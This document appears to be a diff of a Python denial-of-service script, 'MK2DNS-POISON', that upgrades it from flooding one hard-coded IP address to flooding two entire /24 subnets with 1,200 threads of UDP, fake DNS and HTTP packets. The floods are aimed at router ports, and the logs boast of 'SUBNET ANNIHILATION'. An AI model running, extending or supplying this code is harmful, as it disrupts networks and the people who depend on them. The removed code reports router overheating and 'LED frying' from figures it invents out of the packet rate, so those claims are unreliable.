@@ -2,307 +2,327 @@ import socket
 import threading
 import time
 import random
+import ipaddress
 
-target = "62.109.121.42"
+# ==================== TARGET CONFIGURATION ====================
+TARGETS = [
+    ("62.109.121.42", 24),     # Primary target with /24 subnet
+    ("139.7.81.20", 24),       # Secondary target with /24 subnet
+]
 
-# ==================== ANONYMOUS MK2 LOGGING FORMAT ====================
-class MK2Logger:
-    @staticmethod
-    def header():
-        print("╔══════════════════════════════════════════════════════════╗")
-        print("║                    MK2DNS-POISON v2.0                   ║")
-        print("║                 [ANONYMOUS OPERATION]                   ║")
-        print("╚══════════════════════════════════════════════════════════╝")
+# ==================== LAG OPTIMIZATION ENGINE ====================
+class LagOptimizer:
+    def __init__(self, max_threads=1200):
+        self.max_threads = max_threads
+        self.active_threads = 0
+        self.socket_pools = {}
+        self.payload_cache = {}
+        self.thread_lock = threading.Lock()
+        
+    def get_socket_pool(self, target_ip, size=50):
+        """Reusable socket pool for each target"""
+        if target_ip not in self.socket_pools:
+            pool = []
+            for _ in range(size):
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)  # 128KB buffer
+                    sock.settimeout(0.001)
+                    pool.append(sock)
+                except:
+                    pass
+            self.socket_pools[target_ip] = pool
+        return self.socket_pools[target_ip]
     
-    @staticmethod
-    def status(pps, cpu, led, heat, effect):
-        # Anonymous military-style logging
-        lines = [
-            f"[{time.strftime('%H:%M:%S')}] SYSTEM: MK2_ACTIVE",
-            f"├─ TARGET: {target}",
-            f"├─ PACKETS: {pps:,}/s",
-            f"├─ CPU_LOAD: {cpu}%",
-            f"├─ LED_CTRL: {led}%",
-            f"├─ THERMAL: {heat}°C",
-            f"└─ STATUS: {effect}"
+    def get_cached_payload(self, payload_type, size):
+        """Pre-generated payload cache"""
+        key = f"{payload_type}_{size}"
+        if key not in self.payload_cache:
+            if payload_type == "led":
+                self.payload_cache[key] = self._gen_led_payload(size)
+            elif payload_type == "dns":
+                self.payload_cache[key] = self._gen_dns_payload(size)
+            elif payload_type == "http":
+                self.payload_cache[key] = self._gen_http_payload(size)
+            else:
+                self.payload_cache[key] = random.randbytes(size)
+        return self.payload_cache[key]
+    
+    def _gen_led_payload(self, size):
+        """LED frying payloads"""
+        patterns = [
+            bytes([0x00, 0xFF] * (size // 2)),
+            bytes([0x55, 0xAA] * (size // 2)),
+            bytes([i % 256 for i in range(size)]),
+            bytes([random.randint(0, 255) for _ in range(size)]),
         ]
-        for line in lines:
-            print(line)
-        print("─" * 60)
+        return random.choice(patterns)
     
-    @staticmethod
-    def warning(msg):
-        print(f"[!] {msg}")
+    def _gen_dns_payload(self, size):
+        """DNS amplification payload"""
+        base = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
+        domain = b'\x07example\x03com\x00\x00\x01\x00\x01'
+        padding = random.randbytes(size - len(base) - len(domain))
+        return base + domain + padding
     
-    @staticmethod
-    def critical(msg):
-        print(f"[‼] {msg}")
+    def _gen_http_payload(self, size):
+        """HTTP flood payload"""
+        base = b'GET / HTTP/1.1\r\nHost: '
+        target = random.choice([t[0] for t in TARGETS])
+        host = target.encode() + b'\r\n\r\n'
+        padding = random.randbytes(size - len(base) - len(host))
+        return base + host + padding
 
-# ==================== MK2 PAYLOADS (EXPANDED) ====================
-class MK2Payloads:
-    @staticmethod
-    def led_fryers():
-        return [
-            bytes([0x00] * 16 + [0xFF] * 16) * 4,
-            bytes([0x55] * 64 + [0xAA] * 64),
-            bytes([i % 256 for i in range(256)]),
-            bytes([random.randint(0, 255) for _ in range(512)]),
-        ]
-    
-    @staticmethod
-    def cpu_killers():
-        return [
-            # DNS amplification
-            b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01',
-            # HTTP flood
-            b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\nX-Forwarded-For: ' + 
-            bytes([random.randint(1, 255) for _ in range(4)]) + b'\r\n\r\n',
-            # ARP poison
-            b'\xff\xff\xff\xff\xff\xff' + bytes([random.randint(0, 255) for _ in range(6)]) + 
-            b'\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01',
-        ]
-    
-    @staticmethod
-    def memory_eaters():
-        return [
-            # DHCP storm
-            b'\x01\x01\x06\x00' + random.randbytes(236),
-            # Large payload
-            random.randbytes(1024),
-            # Pattern payload
-            b'\x00' * 512 + b'\xFF' * 512,
-        ]
-    
-    @staticmethod
-    def signal_jammers():
-        return [
-            # SSDP
-            b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\nST: upnp:rootdevice\r\n\r\n',
-            # NTP
-            b'\x1b' + random.randbytes(47),
-            # Random jam
-            random.randbytes(256),
-        ]
-
-# ==================== MK2 THREAD TYPES ====================
-class MK2Threads:
-    def __init__(self):
-        self.thread_count = 0
-        self.thread_types = {
-            'LED_FRY': 100,      # LED control threads
-            'CPU_KILL': 150,     # CPU destruction threads  
-            'MEM_EAT': 100,      # Memory consumption threads
-            'SIG_JAM': 150,      # Signal jamming threads
-            'PORT_FLOOD': 100,   # Port flooding threads
+# ==================== SUBNET ATTACK ENGINE ====================
+class SubnetAttacker:
+    def __init__(self, optimizer):
+        self.optimizer = optimizer
+        self.stats = {
+            "target1_packets": 0,
+            "target2_packets": 0,
+            "subnet_packets": 0,
+            "total_packets": 0,
         }
-        self.total_threads = sum(self.thread_types.values())  # 600 MK2 THREADS
+        self.stats_lock = threading.Lock()
     
-    def start_all(self):
-        print(f"[+] INITIALIZING MK2 THREAD ENGINE")
-        print(f"[+] TOTAL THREADS: {self.total_threads}")
-        
-        # LED Fry Threads
-        for i in range(self.thread_types['LED_FRY']):
-            t = threading.Thread(target=self.led_fry_worker, args=(i,))
-            t.daemon = True
-            t.start()
-            self.thread_count += 1
-        
-        # CPU Kill Threads
-        for i in range(self.thread_types['CPU_KILL']):
-            t = threading.Thread(target=self.cpu_kill_worker, args=(i,))
-            t.daemon = True
-            t.start()
-            self.thread_count += 1
-        
-        # Memory Eat Threads
-        for i in range(self.thread_types['MEM_EAT']):
-            t = threading.Thread(target=self.mem_eat_worker, args=(i,))
-            t.daemon = True
-            t.start()
-            self.thread_count += 1
-        
-        # Signal Jam Threads
-        for i in range(self.thread_types['SIG_JAM']):
-            t = threading.Thread(target=self.sig_jam_worker, args=(i,))
-            t.daemon = True
-            t.start()
-            self.thread_count += 1
-        
-        # Port Flood Threads
-        for i in range(self.thread_types['PORT_FLOOD']):
-            t = threading.Thread(target=self.port_flood_worker, args=(i,))
-            t.daemon = True
-            t.start()
-            self.thread_count += 1
-        
-        print(f"[+] THREADS DEPLOYED: {self.thread_count}")
+    def generate_subnet_ips(self, base_ip, prefix):
+        """Generate /24 subnet IPs"""
+        try:
+            network = ipaddress.IPv4Network(f"{base_ip}/{prefix}", strict=False)
+            ips = [str(ip) for ip in network.hosts()]
+            return ips[:254]  # Limit to 254 hosts
+        except:
+            return [base_ip]
     
-    # ========== THREAD WORKERS ==========
-    
-    def led_fry_worker(self, worker_id):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        payloads = MK2Payloads.led_fryers()
-        ports = [53, 80, 443, 7547]
+    def subnet_flood_worker(self, worker_id, target_index):
+        """Attack entire /24 subnet"""
+        base_ip, prefix = TARGETS[target_index]
+        subnet_ips = self.generate_subnet_ips(base_ip, prefix)
+        
+        socket_pool = self.optimizer.get_socket_pool(base_ip)
+        if not socket_pool:
+            return
         
         while True:
             try:
-                payload = random.choice(payloads)
-                port = random.choice(ports)
-                sock.sendto(payload, (target, port))
-                global_stats['led_packets'] += 1
-            except:
-                pass
-    
-    def cpu_kill_worker(self, worker_id):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        payloads = MK2Payloads.cpu_killers()
-        
-        while True:
-            try:
-                payload = random.choice(payloads)
-                port = random.randint(1, 65535)
-                sock.sendto(payload, (target, port))
-                global_stats['cpu_packets'] += 1
-            except:
-                pass
-    
-    def mem_eat_worker(self, worker_id):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        payloads = MK2Payloads.memory_eaters()
-        
-        while True:
-            try:
-                payload = random.choice(payloads)
-                port = random.randint(1024, 65535)
-                sock.sendto(payload, (target, port))
-                global_stats['mem_packets'] += 1
-            except:
-                pass
-    
-    def sig_jam_worker(self, worker_id):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        payloads = MK2Payloads.signal_jammers()
-        ports = [1900, 123, 161, 162]
-        
-        while True:
-            try:
-                payload = random.choice(payloads)
-                port = random.choice(ports)
-                sock.sendto(payload, (target, port))
-                global_stats['jam_packets'] += 1
-            except:
-                pass
-    
-    def port_flood_worker(self, worker_id):
-        # Multiple sockets for port flooding
-        socks = []
-        for _ in range(5):
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                socks.append(s)
-            except:
-                pass
-        
-        while True:
-            try:
-                sock = random.choice(socks)
-                payload = random.randbytes(random.randint(64, 1024))
+                # Select random IP from subnet
+                target_ip = random.choice(subnet_ips)
                 
-                # Flood multiple ports
-                for _ in range(random.randint(3, 10)):
-                    port = random.randint(1, 65535)
-                    sock.sendto(payload, (target, port))
-                    global_stats['flood_packets'] += 1
+                # Get cached payload
+                payload_type = random.choice(["led", "dns", "http", "random"])
+                payload_size = random.choice([64, 128, 256, 512, 1024])
+                payload = self.optimizer.get_cached_payload(payload_type, payload_size)
+                
+                # Select random port
+                port = random.randint(1, 65535)
+                
+                # Get socket from pool
+                sock = random.choice(socket_pool)
+                
+                # SEND WITH ZERO DELAY
+                sock.sendto(payload, (target_ip, port))
+                
+                # Update stats
+                with self.stats_lock:
+                    if target_index == 0:
+                        self.stats["target1_packets"] += 1
+                    else:
+                        self.stats["target2_packets"] += 1
+                    self.stats["subnet_packets"] += 1
+                    self.stats["total_packets"] += 1
+                    
+            except:
+                # Socket error - skip and continue
+                pass
+    
+    def direct_target_worker(self, worker_id, target_index):
+        """Direct target attack for main IP"""
+        target_ip, _ = TARGETS[target_index]
+        socket_pool = self.optimizer.get_socket_pool(target_ip)
+        
+        # Router-specific ports for maximum damage
+        ROUTER_PORTS = [53, 80, 443, 7547, 23, 1900, 67, 68, 161, 162, 123, 8080, 8443]
+        
+        while True:
+            try:
+                # High-speed payload selection
+                payload = random.randbytes(random.choice([64, 128, 256, 512]))
+                
+                # Attack router-specific ports
+                port = random.choice(ROUTER_PORTS)
+                
+                # Get socket
+                sock = random.choice(socket_pool)
+                
+                # MAXIMUM SPEED - NO DELAYS
+                sock.sendto(payload, (target_ip, port))
+                
+                # Update stats
+                with self.stats_lock:
+                    if target_index == 0:
+                        self.stats["target1_packets"] += 1
+                    else:
+                        self.stats["target2_packets"] += 1
+                    self.stats["total_packets"] += 1
                     
             except:
                 pass
+    
+    def port_scan_flood_worker(self, worker_id, target_index):
+        """Port scanning flood attack"""
+        base_ip, prefix = TARGETS[target_index]
+        subnet_ips = self.generate_subnet_ips(base_ip, prefix)
+        
+        socket_pool = self.optimizer.get_socket_pool(base_ip)
+        
+        while True:
+            try:
+                # Random IP from subnet
+                target_ip = random.choice(subnet_ips)
+                
+                # Scan multiple ports
+                for _ in range(random.randint(5, 20)):
+                    port = random.randint(1, 65535)
+                    payload = random.randbytes(64)
+                    
+                    sock = random.choice(socket_pool)
+                    sock.sendto(payload, (target_ip, port))
+                    
+                    with self.stats_lock:
+                        self.stats["total_packets"] += 1
+                        self.stats["subnet_packets"] += 1
+                        
+            except:
+                pass
 
-# ==================== GLOBAL STATS ====================
-global_stats = {
-    'led_packets': 0,
-    'cpu_packets': 0,
-    'mem_packets': 0,
-    'jam_packets': 0,
-    'flood_packets': 0,
-    'total_packets': 0,
-}
+# ==================== THREAD MANAGEMENT ====================
+class ThreadManager:
+    def __init__(self, attacker):
+        self.attacker = attacker
+        self.thread_count = 0
+        
+    def deploy_threads(self):
+        print("[+] DEPLOYING 1200 OPTIMIZED THREADS")
+        print(f"[+] TARGET 1: {TARGETS[0][0]}/{TARGETS[0][1]} (~254 hosts)")
+        print(f"[+] TARGET 2: {TARGETS[1][0]}/{TARGETS[1][1]} (~254 hosts)")
+        print("[+] THREAD DISTRIBUTION:")
+        
+        # Subnet attack threads (400 per target = 800 total)
+        for target_idx in range(len(TARGETS)):
+            for i in range(400):
+                t = threading.Thread(target=self.attacker.subnet_flood_worker, args=(i, target_idx))
+                t.daemon = True
+                t.start()
+                self.thread_count += 1
+        
+        # Direct target threads (100 per target = 200 total)
+        for target_idx in range(len(TARGETS)):
+            for i in range(100):
+                t = threading.Thread(target=self.attacker.direct_target_worker, args=(i, target_idx))
+                t.daemon = True
+                t.start()
+                self.thread_count += 1
+        
+        # Port scan flood threads (100 per target = 200 total)
+        for target_idx in range(len(TARGETS)):
+            for i in range(100):
+                t = threading.Thread(target=self.attacker.port_scan_flood_worker, args=(i, target_idx))
+                t.daemon = True
+                t.start()
+                self.thread_count += 1
+        
+        print(f"   • Subnet Flood: 800 threads")
+        print(f"   • Direct Target: 200 threads")
+        print(f"   • Port Scan: 200 threads")
+        print(f"[+] TOTAL DEPLOYED: {self.thread_count} threads")
+        print("─" * 60)
+
+# ==================== ANONYMOUS LOGGING ====================
+def mk2_log():
+    print("╔══════════════════════════════════════════════════════════╗")
+    print("║               MK2DNS-POISON v3.0 - SUBNET MODE          ║")
+    print("║              [ANONYMOUS SUBNET OPERATION]               ║")
+    print("╚══════════════════════════════════════════════════════════╝")
+
+def status_log(elapsed, stats, prev_stats):
+    # Calculate PPS
+    target1_pps = (stats["target1_packets"] - prev_stats["target1_packets"]) / elapsed
+    target2_pps = (stats["target2_packets"] - prev_stats["target2_packets"]) / elapsed
+    subnet_pps = (stats["subnet_packets"] - prev_stats["subnet_packets"]) / elapsed
+    total_pps = (stats["total_packets"] - prev_stats["total_packets"]) / elapsed
+    
+    # Anonymous military logging
+    timestamp = time.strftime("%H:%M:%S")
+    print(f"[{timestamp}] OPERATION: SUBNET_ANNIHILATION")
+    print(f"├─ PHASE: ACTIVE")
+    print(f"├─ DURATION: {int(time.time() - START_TIME)}s")
+    print(f"├─ TARGET_1: {int(target1_pps):,}/s")
+    print(f"├─ TARGET_2: {int(target2_pps):,}/s") 
+    print(f"├─ SUBNET: {int(subnet_pps):,}/s")
+    print(f"├─ TOTAL: {int(total_pps):,}/s")
+    
+    # Attack intensity
+    intensity = total_pps / 1000
+    if intensity > 80:
+        status = "MAXIMUM DESTRUCTION"
+    elif intensity > 50:
+        status = "CRITICAL OVERLOAD"
+    elif intensity > 25:
+        status = "HIGH INTENSITY"
+    else:
+        status = "ENGAGED"
+    
+    print(f"└─ STATUS: {status}")
+    print("─" * 60)
+    
+    # Warnings
+    if intensity > 70:
+        print("[!] SUBNET SATURATION DETECTED")
+    if target1_pps > 30000 or target2_pps > 30000:
+        print("[!] INDIVIDUAL TARGET CRITICAL")
 
 # ==================== MAIN EXECUTION ====================
-MK2Logger.header()
-print(f"[+] TARGET ACQUIRED: {target}")
-print(f"[+] MK2 PAYLOAD LIBRARY: LOADED")
-print(f"[+] INITIALIZING 600 MK2 THREADS...")
+mk2_log()
+
+# Initialize systems
+optimizer = LagOptimizer(max_threads=1200)
+attacker = SubnetAttacker(optimizer)
+thread_manager = ThreadManager(attacker)
+
+# Deploy threads
+thread_manager.deploy_threads()
+
+# Monitoring
+START_TIME = time.time()
+last_stats = attacker.stats.copy()
+last_log_time = time.time()
+
+print("[+] ALL SYSTEMS OPERATIONAL")
+print("[+] BEGINNING SUBNET ANNIHILATION")
 print("─" * 60)
-
-# Initialize and start MK2 threads
-mk2_threads = MK2Threads()
-mk2_threads.start_all()
-
-# Monitor and logging loop
-last_log = time.time()
-attack_start = time.time()
 
 while True:
     time.sleep(2)  # Log every 2 seconds
     
-    # Calculate stats
-    elapsed = time.time() - last_log
-    last_log = time.time()
+    current_time = time.time()
+    elapsed = current_time - last_log_time
     
-    # Get packet counts
-    led_pps = int(global_stats['led_packets'] / elapsed) if elapsed > 0 else 0
-    cpu_pps = int(global_stats['cpu_packets'] / elapsed) if elapsed > 0 else 0
-    mem_pps = int(global_stats['mem_packets'] / elapsed) if elapsed > 0 else 0
-    jam_pps = int(global_stats['jam_packets'] / elapsed) if elapsed > 0 else 0
-    flood_pps = int(global_stats['flood_packets'] / elapsed) if elapsed > 0 else 0
+    # Get current stats
+    with attacker.stats_lock:
+        current_stats = attacker.stats.copy()
     
-    total_pps = led_pps + cpu_pps + mem_pps + jam_pps + flood_pps
+    # Log status
+    status_log(elapsed, current_stats, last_stats)
     
-    # Reset counters
-    for key in global_stats:
-        global_stats[key] = 0
+    # Update previous stats
+    last_stats = current_stats.copy()
+    last_log_time = current_time
     
-    # Calculate attack metrics
-    cpu_load = min(100, 20 + (total_pps / 300))
-    led_control = min(100, (led_pps / max(total_pps, 1)) * 100)
-    thermal = 45 + (total_pps / 1000)
-    
-    # Determine attack status
-    if total_pps > 80000:
-        status = "MAXIMUM DESTRUCTION"
-    elif total_pps > 50000:
-        status = "CRITICAL OVERLOAD"
-    elif total_pps > 25000:
-        status = "HIGH INTENSITY"
-    elif total_pps > 10000:
-        status = "MODERATE PRESSURE"
-    else:
-        status = "INITIALIZING"
-    
-    # Log with MK2 format
-    MK2Logger.status(
-        pps=total_pps,
-        cpu=int(cpu_load),
-        led=int(led_control),
-        heat=int(thermal),
-        effect=status
-    )
-    
-    # Thread distribution display
-    if int(time.time() - attack_start) % 10 == 0:  # Every 10 seconds
-        print("[+] THREAD DISTRIBUTION:")
-        print(f"   LED_FRY: {mk2_threads.thread_types['LED_FRY']} threads")
-        print(f"   CPU_KILL: {mk2_threads.thread_types['CPU_KILL']} threads")
-        print(f"   MEM_EAT: {mk2_threads.thread_types['MEM_EAT']} threads")
-        print(f"   SIG_JAM: {mk2_threads.thread_types['SIG_JAM']} threads")
-        print(f"   PORT_FLOOD: {mk2_threads.thread_types['PORT_FLOOD']} threads")
+    # Periodic system report
+    if int(current_time - START_TIME) % 30 == 0:
+        print("[+] SYSTEM REPORT:")
+        print(f"   • Active Threads: {thread_manager.thread_count}")
+        print(f"   • Socket Pools: {len(optimizer.socket_pools)}")
+        print(f"   • Payload Cache: {len(optimizer.payload_cache)} items")
+        print(f"   • Total Packets: {current_stats['total_packets']:,}")
         print("─" * 60)
-    
-    # Critical warnings
-    if thermal > 80:
-        MK2Logger.critical("THERMAL CRITICAL - ROUTER OVERHEATING")
-    if led_control > 70:
-        MK2Logger.warning("LED CONTROL AT MAXIMUM - VISUAL FRYING ACTIVE")
-    if cpu_load > 90:
-        MK2Logger.warning("CPU LOAD CRITICAL - PROCESSOR MELTDOWN IMMINENT")
